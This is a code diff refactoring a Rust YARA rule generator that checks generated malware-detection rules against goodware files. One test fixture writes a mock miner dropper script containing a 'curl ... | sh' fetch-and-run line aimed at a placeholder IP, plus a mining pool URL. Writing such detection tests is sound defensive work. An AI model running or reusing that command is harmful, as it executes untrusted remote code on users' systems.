@@ -10,7 +10,7 @@
 
 use crate::db::Cache;
 use crate::error::Result;
-use crate::system;
+use crate::utils::{files, os, parallel};
 use std::collections::HashMap;
 use std::path::{Path, PathBuf};
 pub use wpantry_yara::generate::Describe;
@@ -70,7 +70,7 @@ pub fn build(cache: &Cache, files: &[PathBuf], status: &dyn Fn(&str)) -> Result<
         if i % 100 == 0 {
             status(&format!("Reading goodware: {i} of {} files", files.len()));
         }
-        let Ok(data) = system::read_capped_bytes(f, MAX_FILE) else { continue };
+        let Ok(data) = files::read_capped_bytes(f, MAX_FILE) else { continue };
         read += 1;
         let mut items: Vec<Vec<u8>> = generate::strings(&data).into_iter().map(|s| s.bytes).collect();
         items.extend(generate::opcodes(&data));
@@ -88,7 +88,7 @@ pub fn build(cache: &Cache, files: &[PathBuf], status: &dyn Fn(&str)) -> Result<
             stmt.execute(rusqlite::params![item, *n as i64])?;
         }
     }
-    cache.set("goodware:built", &format!("{}", system::now()))?;
+    cache.set("goodware:built", &format!("{}", os::now()))?;
     cache.commit()?;
     Ok(read)
 }
@@ -122,7 +122,7 @@ pub struct Output {
 
 /// Generate a rule from `samples` and check it against the goodware files.
 pub fn run(cache: &Cache, samples: &[PathBuf], d: &Describe) -> Result<Option<Output>> {
-    let data: Vec<Vec<u8>> = samples.iter().map(|s| system::read_capped_bytes(s, MAX_FILE)).collect::<Result<_>>()?;
+    let data: Vec<Vec<u8>> = samples.iter().map(|s| files::read_capped_bytes(s, MAX_FILE)).collect::<Result<_>>()?;
     let refs: Vec<&[u8]> = data.iter().map(Vec::as_slice).collect();
     let Some(rule) = generate::generate(&refs, &Db(cache), d) else { return Ok(None) };
     let mut c = Compiler::new();
@@ -132,8 +132,8 @@ pub fn run(cache: &Cache, samples: &[PathBuf], d: &Describe) -> Result<Option<Ou
         let mut stmt = cache.conn.prepare("SELECT path FROM goodware_files")?;
         stmt.query_map([], |r| r.get::<_, String>(0))?.filter_map(|p| p.ok().map(PathBuf::from)).collect()
     };
-    let false_positives: Vec<PathBuf> = system::par_map(&goodware, system::cores(), |f| {
-        let hit = system::read_capped_bytes(f, MAX_FILE)
+    let false_positives: Vec<PathBuf> = parallel::par_map(&goodware, parallel::cores(), |f| {
+        let hit = files::read_capped_bytes(f, MAX_FILE)
             .is_ok_and(|b| !rules.scan(&b, &ScanOptions::default()).matches.is_empty());
         hit.then(|| f.clone())
     })
@@ -158,7 +158,7 @@ pub fn rule_name(family: &str, category: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::system::TempDir;
+    use crate::utils::temp::TempDir;
 
     #[test]
     fn builds_goodware_and_generates_a_rule_that_avoids_it() {
@@ -179,7 +179,7 @@ mod tests {
 
         let sample = d.path().join("dropper.sh");
         std::fs::write(&sample, b"#!/bin/sh\necho shared helper line\npkill -f xmrig\ncurl -s http://203.0.113.9/x | sh\nPOOL=stratum+tcp://pool.example:3333\n").unwrap();
-        let hashes = vec![crate::sha256::hex(&std::fs::read(&sample).unwrap())];
+        let hashes = vec![crate::utils::sha256::hex(&std::fs::read(&sample).unwrap())];
         let name = rule_name("Test Kit", "miner");
         assert_eq!(name, "Gen_miner_Test_Kit");
         let describe = Describe {
